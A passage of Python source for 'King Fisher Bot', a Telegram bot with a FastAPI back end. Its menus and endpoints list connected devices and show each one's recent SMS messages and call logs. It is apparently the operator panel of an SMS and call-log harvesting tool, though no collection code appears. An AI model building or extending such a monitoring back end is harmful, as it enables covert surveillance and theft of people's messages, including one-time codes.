    name = update.effective_user.first_name or "𝗨𝘀𝗲𝗿"
    text = await get_opening_text(name)
    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu(),
    )

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔄 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗲𝗱</b>\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🟢 𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗥𝗲𝗳𝗿𝗲𝘀𝗵𝗲𝗱\n"
        "🟢 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗥𝗲𝗮𝗱𝘆\n"
        "🟢 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗔𝗰𝘁𝗶𝘃𝗲\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode=ParseMode.HTML,
        reply_markup=main_menu(),
    )

async def close_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(CLOSING, parse_mode=ParseMode.HTML)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        HELP,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def about_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        ABOUT,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def devices_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    devices_list = DeviceDataManager.get_devices_with_names()
    device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
    await update.message.reply_text(
        format_device_info(device_details),
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def terms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        TERMS,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def privacy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        PRIVACY,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def support_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        SUPPORT,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def offer_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        OFFER,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = DeviceDataManager.get_stats()
    devices_list = DeviceDataManager.get_devices_with_names()
    await update.message.reply_text(
        format_status(stats, devices_list),
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu("main"),
    )

# ============ CALLBACK HANDLER ============

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    d = q.data
    user_id = str(q.from_user.id)
    device_id = f"device_{user_id}"
    
    if d == "items":
        await q.edit_message_text(
            "📦 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗜𝘁𝗲𝗺𝘀</b>\n\n<i>𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆:</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=items_menu(),
        )
    elif d == "sms":
        sms_data = DeviceDataManager.get_sms(device_id, 10)
        await q.edit_message_text(
            format_realtime_sms(sms_data),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("items"),
        )
    elif d == "call":
        call_data = DeviceDataManager.get_calls(device_id, 10)
        await q.edit_message_text(
            format_realtime_calls(call_data),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("items"),
        )
    elif d == "status":
        stats = DeviceDataManager.get_stats()
        devices_list = DeviceDataManager.get_devices_with_names()
        await q.edit_message_text(
            format_status(stats, devices_list),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("main"),
        )
    elif d == "devices":
        devices_list = DeviceDataManager.get_devices_with_names()
        device_details = [DeviceDataManager.get_device_details(dev["id"]) for dev in devices_list]
        await q.edit_message_text(
            format_device_info(device_details),
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu("main"),
        )
    elif d == "restart":
        await q.edit_message_text(
            "🔄 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗲𝗱</b>\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "🟢 𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗥𝗲𝗳𝗿𝗲𝘀𝗵𝗲𝗱\n"
            "🟢 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 𝗥𝗲𝗮𝗱𝘆\n"
            "🟢 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗔𝗰𝘁𝗶𝘃𝗲\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(),
        )
    elif d == "close":
        await q.edit_message_text(CLOSING, parse_mode=ParseMode.HTML)
    elif d == "help":
        await q.edit_message_text(
            HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "about":
        await q.edit_message_text(
            ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "terms":
        await q.edit_message_text(
            TERMS, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "privacy":
        await q.edit_message_text(
            PRIVACY, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "support":
        await q.edit_message_text(
            SUPPORT, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "offer":
        await q.edit_message_text(
            OFFER, parse_mode=ParseMode.HTML, reply_markup=back_menu("main")
        )
    elif d == "back_main":
        name = q.from_user.first_name or "𝗨𝘀𝗲𝗿"
        text = await get_opening_text(name)
        await q.edit_message_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=main_menu(),
        )
    elif d == "back_items":
        await q.edit_message_text(
            "📦 <b>𝗦𝘆𝘀𝘁𝗲𝗺 𝗜𝘁𝗲𝗺𝘀</b>\n\n<i>𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗰𝗮𝘁𝗲𝗴𝗼𝗿𝘆:</i>",
            parse_mode=ParseMode.HTML,
            reply_markup=items_menu(),
        )

# ============ REGISTER HANDLERS ============

telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CommandHandler("restart", restart))
telegram_app.add_handler(CommandHandler("close", close_cmd))
telegram_app.add_handler(CommandHandler("help", help_cmd))
telegram_app.add_handler(CommandHandler("about", about_cmd))
telegram_app.add_handler(CommandHandler("devices", devices_cmd))
telegram_app.add_handler(CommandHandler("terms", terms_cmd))
telegram_app.add_handler(CommandHandler("privacy", privacy_cmd))
telegram_app.add_handler(CommandHandler("support", support_cmd))
telegram_app.add_handler(CommandHandler("offer", offer_cmd))
telegram_app.add_handler(CommandHandler("status", status_cmd))
telegram_app.add_handler(CallbackQueryHandler(callbacks))

# ============ FASTAPI APP ============

@asynccontextmanager
async def lifespan(app: FastAPI):
    await telegram_app.initialize()
    await telegram_app.start()
    webhook_url = f"{PUBLIC_URL}/telegram/webhook"
    await telegram_app.bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET or None, drop_pending_updates=True)
    logger.info("✅ Webhook configured: %s", webhook_url)
    yield
    try:
        await telegram_app.stop()
        await telegram_app.shutdown()
        logger.info("✅ Bot shut down successfully")
    except Exception as e:
        logger.error(f"❌ Shutdown error: {e}")

app = FastAPI(title="King Fisher Bot", version="3.0.0", description="Real-time SMS and Call Log Monitor", lifespan=lifespan)

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def home():
    return {"status": "online", "service": "King Fisher Bot", "version": "3.0.0", "mode": "Real Data", "docs": "/docs", "repository": "https://github.com/King-Fisher-bot/King-Fisher"}

@app.get("/health")
async def health():
    stats = DeviceDataManager.get_stats()
    return {"status": "healthy", "devices": stats["devices"], "messages": stats["total"]}

@app.post("/telegram/webhook")
async def webhook(request: Request, x_telegram_bot_api_secret_token: str | None = Header(default=None)):
    if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid webhook secret")
    try:
        data = await request.json()
        update = Update.de_json(data, telegram_app.bot)
        await telegram_app.process_update(update)
        return {"ok": True}
    except Exception as e:
        logger.error(f"❌ Webhook error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/status")
async def status():
    stats = DeviceDataManager.get_stats()
    devices = DeviceDataManager.get_devices_with_names()
    device_details = [{"id": dev["id"], "name": dev["name"], "sms_count": len(DEVICE_DATA["sms"].get(dev["id"], [])), "call_count": len(DEVICE_DATA["calls"].get(dev["id"], []))} for dev in devices]
    return {"status": "online", "devices": stats["devices"], "sms": stats["sms"], "calls": stats["calls"], "total": stats["total"], "device_list": device_details, "repository": "https://github.com/King-Fisher-bot/King-Fisher"}
